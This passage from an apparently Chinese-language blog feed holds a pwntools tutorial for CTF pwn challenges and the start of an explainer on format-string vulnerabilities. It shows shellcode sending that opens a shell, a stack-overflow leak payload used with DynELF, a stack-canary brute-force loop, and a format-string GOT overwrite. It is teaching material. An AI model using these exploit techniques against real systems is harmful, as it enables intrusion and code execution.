如果给参数，读入前hint行</li></ul><ul><li>f.write(s)  写入字符串或字节流</li><li>f.writelines(lines) 将一个元素全为字符串的<strong>列表</strong>，元素拼接后写入文件</li><li>f.seek(offset) 控制文件操作指针的位置 0-开头 1-当前 2-结尾</li></ul><p>###tip </p><p><code>\</code>可以给没写完的程序语句换行</p><p><code>type(x)</code> 返回变量x的类型</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#python之旅&lt;br&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>pwntools</title>
    <link href="http://yoursite.com/2019/04/01/pwntools/"/>
    <id>http://yoursite.com/2019/04/01/pwntools/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-01T13:56:25.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwntools的学习使用"><a href="#pwntools的学习使用" class="headerlink" title="pwntools的学习使用"></a>pwntools的学习使用</h1><a id="more"></a><p>[TOC]</p><hr><h2 id="大致框架"><a href="#大致框架" class="headerlink" title="大致框架"></a>大致框架</h2><p>官网的一个简单样例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'exploitme.example.com'</span>, <span class="number">31337</span>)</span><br><span class="line"><span class="comment"># EXPLOIT CODE GOES HERE</span></span><br><span class="line">r.send(asm(shellcraft.sh()))</span><br><span class="line">r.interactive()<span class="number">1234567</span></span><br></pre></td></tr></table></figure><p>基本上仿造这个格式就可以写exp了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure><p>用来导入pwntools模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(arch = &apos;i386&apos;, os = &apos;linux&apos;)</span><br></pre></td></tr></table></figure><p>设置目标机的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = remote(&apos;exploitme.example.com&apos;, 31337)</span><br></pre></td></tr></table></figure><p>用来建立一个远程连接，url或者ip作为地址，然后指明端口</p><p>这里也可以仅仅使用本地文件,调试时方便:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = process(&quot;./test&quot;)</span><br></pre></td></tr></table></figure><p>test即为文件名,这使得改变远程和本地十分方便.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p>asm()函数接收一个字符串作为参数，得到汇编码的机器代码。<br>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; asm(&apos;mov eax, 0&apos;)</span><br><span class="line">&apos;\xb8\x00\x00\x00\x00&apos;12</span><br></pre></td></tr></table></figure><p>shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。</p><p>其中的子模块声明架构，比如shellcraft.arm 是ARM架构的，shellcraft.amd64是AMD64架构，shellcraft.i386是Intel 80386架构的，以及有一个shellcraft.common是所有架构通用的。</p><p>而这里的shellcraft.sh()则是执行/bin/sh的shellcode了</p><p>r.send()将shellcode发送到远程连接</p><p>最后，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>将控制权交给用户，这样就可以使用打开的shell了</p><h2 id="Context设置"><a href="#Context设置" class="headerlink" title="Context设置"></a>Context设置</h2><p><code>context</code>是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p><p>一般来说我们设置context只需要简单的一句话:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</span><br></pre></td></tr></table></figure><p>这句话的意思是：<br>\1. os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux<br>\2. arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’<br>\3. log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</p><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>本地process()、远程remote()。对于remote函数可以接url并且指定端口。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">'pwnme'</span>)</span><br><span class="line">io = process([<span class="string">'./col'</span>,s])<span class="comment">#带参数</span></span><br><span class="line">io = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9881</span>)</span><br><span class="line">p = ssh(host=<span class="string">'pwnable.kr'</span>, port=<span class="number">2222</span>, user=<span class="string">'passcode'</span>, password=<span class="string">'guest'</span>)<span class="comment">#ssh连接</span></span><br></pre></td></tr></table></figure><h2 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">send(data) : 发送数据</span><br><span class="line">sendline(data) : 发送一行数据，相当于在末尾加\n</span><br><span class="line">io.sendlineafter(<span class="string">"Input:\n"</span>, data): 在<span class="string">"Input:\n"</span>之后发送数据</span><br><span class="line"></span><br><span class="line">sh.readline()</span><br><span class="line">recv(numb=<span class="number">4096</span>, timeout=default) : 给出接收字节数,timeout指定超时</span><br><span class="line">recvuntil(delims, drop=<span class="literal">False</span>) : 接收到delims的pattern</span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line">（以下可以看作until的特例）</span><br><span class="line">recvline(keepends=<span class="literal">True</span>) : 接收到\n，keepends指定保留\n</span><br><span class="line">recvall() : 接收到EOF</span><br><span class="line">recvrepeat(timeout=default) : 接收到EOF或timeout</span><br><span class="line"></span><br><span class="line">interactive() : 与shell交互</span><br></pre></td></tr></table></figure><h2 id="ELF模块"><a href="#ELF模块" class="headerlink" title="ELF模块"></a>ELF模块</h2><p>ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。</p><p>下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">'/bin/cat'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.address)  <span class="comment"># 文件装载的基地址</span></span><br><span class="line"><span class="number">0x400000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.symbols[<span class="string">'write'</span>]) <span class="comment"># 函数地址</span></span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.got[<span class="string">'write'</span>]) <span class="comment"># GOT表的地址</span></span><br><span class="line"><span class="number">0x60b070</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.plt[<span class="string">'write'</span>]) <span class="comment"># PLT的地址</span></span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"></span><br><span class="line">sh_addr = e.search(<span class="string">'/bin/sh'</span>).next()<span class="comment">#/bin/sh字符串地址</span></span><br><span class="line">bss_addr = e.bss()</span><br></pre></td></tr></table></figure><h2 id="数据打包"><a href="#数据打包" class="headerlink" title="数据打包"></a>数据打包</h2><p>数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便</p><p>用法: </p><ul><li><code>p32/p64</code>: 打包一个整数,分别打包为32或64位 </li><li><code>u32/u64</code>: 解包一个字符串,得到整数</li></ul><p>p对应pack,打包,u对应unpack,解包,简单好记</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(<span class="number">0xdeadbeef</span>) <span class="comment"># pack 32 bits number1</span></span><br><span class="line">buf_addr = int(text, <span class="number">16</span>)<span class="comment">#将text字符串当作十六进制的数字来转化成int型十进制的数字</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="string">'400d4d'</span></span><br><span class="line"><span class="comment">#多为格式化字符串%p所得，</span></span><br><span class="line">a = int(addr, <span class="number">16</span>)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">b = p64(a)</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment">#多为%s或者put write函数所得，为小端序</span></span><br><span class="line">b = <span class="string">'\x4d\x0d\x40'</span></span><br><span class="line">b = b.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">c = u64(b)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><h2 id="数据输出"><a href="#数据输出" class="headerlink" title="数据输出"></a>数据输出</h2><p>如果需要输出一些信息,最好使用pwntools自带的,因为和pwntools本来的格式吻合,看起来也比较舒服,用法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">some_str = &quot;hello, world&quot;</span><br><span class="line">log.info(some_str)12</span><br></pre></td></tr></table></figure><p>其中的info代表是log等级，也可以使用其他log等级。</p><h2 id="Cyclic-Pattern"><a href="#Cyclic-Pattern" class="headerlink" title="Cyclic Pattern"></a>Cyclic Pattern</h2><p>Cyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置。</p><p>在我们完成栈溢出题目的时候，使用pattern可以大大的减少计算溢出点的时间。<br>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cyclic(0x100) # 生成一个0x100大小的pattern，即一个特殊的字符串</span><br><span class="line">cyclic_find(0x61616161) # 找到该数据在pattern中的位置</span><br><span class="line">cyclic_find(&apos;aaaa&apos;) # 查找位置也可以使用字符串去定位123</span><br></pre></td></tr></table></figure><p>比如，我们在栈溢出的时候，首先构造<code>cyclic(0x100)</code>，或者更长长度的pattern，进行输入，输入后pc的值变味了0x61616161，那么我们通过<code>cyclic_find(0x61616161)</code>就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算。</p><h2 id="汇编与shellcode"><a href="#汇编与shellcode" class="headerlink" title="汇编与shellcode"></a>汇编与shellcode</h2><p>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用<code>/bin/sh</code>可以通过shellcraft得到：</p><p>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(shellcraft.sh()) # 打印出shellcode1</span><br></pre></td></tr></table></figure><p>不过，现在我们看到的shellcode还是汇编代码，不是能用的机器码，所以还需要进行一次汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(asm(shellcraft.sh())) # 打印出汇编后的shellcode1</span><br></pre></td></tr></table></figure><p>asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。如果需要更复杂一些的汇编功能，可以使用<code>keystone-engine</code>项目，这里就不再赘述了。</p><p>asm也是架构相关，所以一定要先设置context，避免一些意想不到的错误。</p><h2 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h2><p>DynELF是leak信息的神器。前提条件是要提供一个输入地址，输出此地址最少1byte数的函数。官网给出的说明是：Given a function which can leak data at an arbitrary address, any symbol in any loaded library can be resolved.</p><p>很叼啊，有木有。以下是官方例程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">'./pwnme'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let's say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">'libc'</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">'./pwnme'</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">'libc'</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>)      == system</span><br></pre></td></tr></table></figure><p>emmm下面是我用的一个栗子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">140</span> + p32(write_elf_addr) + p32(start_addr) + p32(<span class="number">0x1</span>) + p32(address) + p32(<span class="number">0x4</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    data = io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#log.debug("%#x =&gt; %s" % (address, (data or '').encode('hex')))</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf = ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure><h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><h3 id="canary爆破"><a href="#canary爆破" class="headerlink" title="canary爆破"></a>canary爆破</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">canary = <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        cn.send(<span class="string">'a'</span>*<span class="number">100</span> + canary + chr(i))</span><br><span class="line">        a = cn.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'recv'</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += chr(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>显示栈信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = &apos;debug&apos;</span><br></pre></td></tr></table></figure><p>用gdb调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io = process(&apos;pwnme&apos;)</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">gdb.attach(proc.pidof(io)[0])</span><br></pre></td></tr></table></figure><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>fmtstr_payload是pwntools提供的函数，用于自动生成格式化字符串。</p><p>fmtstr_payload有两个参数<br>第一个参数是int，用于表示取参数的偏移个数</p><p>第二个参数是字典，字典的意义是往key的地址，写入value的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(7, &#123;printf_got: system_add&#125;)</span><br></pre></td></tr></table></figure><p>这个函数调用会往printf_got中写入system_add</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;pwntools的学习使用&quot;&gt;&lt;a href=&quot;#pwntools的学习使用&quot; class=&quot;headerlink&quot; title=&quot;pwntools的学习使用&quot;&gt;&lt;/a&gt;pwntools的学习使用&lt;/h1&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>fmtstr</title>
    <link href="http://yoursite.com/2019/04/01/%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>http://yoursite.com/2019/04/01/什么是格式化字符串/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-01T13:56:09.945Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是格式化字符串"><a href="#什么是格式化字符串" class="headerlink" title="什么是格式化字符串"></a>什么是格式化字符串</h2><p>学过c语言的都知道printf，fprintf，sprintf,snprintf等这一类类printf函数中经常会用到“%”后面加一个或多个字符做说明符，例如<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">printf(&quot;My name is %s&quot;,&quot;xiaoming&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>调用以后会显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is xiaoming</span><br></pre></td></tr></table></figure><p>该printf函数的第一个参数就是格式化字符串，它主要是依靠一个用来告诉程序如何进行格式化输出的说明符。在C程序中我们有许多用来格式化字符串的说明符，在这些说明符后面我们可以填充我们的内容。记住，说明符的前缀总是“%”字符，另外说明符存在许多不同的数据类型，最常见的包括：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure><p>在这众多的格式符中出了一个叛徒<code>%n</code>，其他都是用来打印的，而<code>%n</code>可以用来把一个int型的值写到指定的地址中。关于这个格式符的利用在后面再介绍，这里先简单给两个例子。</p><p>在gcc环境下，我们编写如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//gcc str.c -m32 -o str</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int c = 0; </span><br><span class="line">printf(&quot;the use of %n&quot;, &amp;c);</span><br><span class="line">printf(&quot;%d\n&quot;, c);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the use of 11</span><br></pre></td></tr></table></figure><p>在VS上直接用以上代码编译后运行则会出错，原因是微软处于安全考虑默认是禁用了<code>%n</code>，要启用则需要加上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_set_printf_count_output(1);</span><br></pre></td></tr></table></figure><p>具体细节可以参考MSDN：<a href="https://msdn.microsoft.com/zh-cn/library/ms175782.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/ms175782.aspx</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int c = 0;</span><br><span class="line">_set_printf_count_output(1);</span><br><span class="line">printf(&quot;the use of %n&quot;, &amp;c);</span><br><span class="line">printf(&quot;%d&quot;, c);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>我们再看一下再栈中的运行细节。</p><p>示例程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int a = 0x3000;</span><br><span class="line">char b[10] = &quot;hahaha&quot;;</span><br><span class="line">int c = 0xFF;</span><br><span class="line">printf(&quot;output %d,%s,%d&quot;,a,b,c);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0040150E    C74424 2C 00300&gt;mov dword ptr ss:[esp+0x2C],0x3000</span><br><span class="line">00401516    C74424 1E 68616&gt;mov dword ptr ss:[esp+0x1E],0x61686168</span><br><span class="line">0040151E    C74424 22 68610&gt;mov dword ptr ss:[esp+0x22],0x6168</span><br><span class="line">00401526    66:C74424 26 00&gt;mov word ptr ss:[esp+0x26],0x0</span><br><span class="line">0040152D    C74424 28 FF000&gt;mov dword ptr ss:[esp+0x28],0xFF</span><br><span class="line">00401535    8B4424 28       mov eax,dword ptr ss:[esp+0x28]          ; eax = 0xFF</span><br><span class="line">00401539    894424 0C       mov dword ptr ss:[esp+0xC],eax           ; [0xc] = 0xFF</span><br><span class="line">0040153D    8D4424 1E       lea eax,dword ptr ss:[esp+0x1E]          ; eax = &amp;str_of_hahaha</span><br><span class="line">00401541    894424 08       mov dword ptr ss:[esp+0x8],eax           ; [0x8] = &amp;str_of_hahaha</span><br><span class="line">00401545    8B4424 2C       mov eax,dword ptr ss:[esp+0x2C]          ; eax = 0x3000</span><br><span class="line">00401549    894424 04       mov dword ptr ss:[esp+0x4],eax           ; [0x4] = eax</span><br><span class="line">0040154D    C70424 00404000 mov dword ptr ss:[esp],study.00404000    ; output %d,%s,%d</span><br><span class="line">00401554    E8 CF100000     call &lt;jmp.&amp;msvcrt.printf&gt;</span><br></pre></td></tr></table></figure><p>栈状态：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0060FE80   00404000  |format = &quot;output %d,%s,%d&quot;</span><br><span class="line">0060FE84   00003000  |&lt;%d&gt; = 3000 (12288.)</span><br><span class="line">0060FE88   0060FE9E  |&lt;%s&gt; = &quot;hahaha&quot;</span><br><span class="line">0060FE8C   000000FF  \&lt;%d&gt; = FF (255.)</span><br></pre></td></tr></table></figure><p>上面是内存低址，下面是内存高址，函数的参数的入栈顺序（此处）为从右到左（__cdecl 调用约定）</p><hr><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>产生这个漏洞的原因只有一个，那就是程序员偷懒。</p><p>比如我想让用户输入一个名字，然后再把这个名字原样输出，一般人可能会这么写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span class="line">printf(&quot;%s&quot;,str);</span><br></pre></td></tr></table></figure><p>这个程序没有问题。<br>但总会有一些人为了偷懒会写成这种样子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span 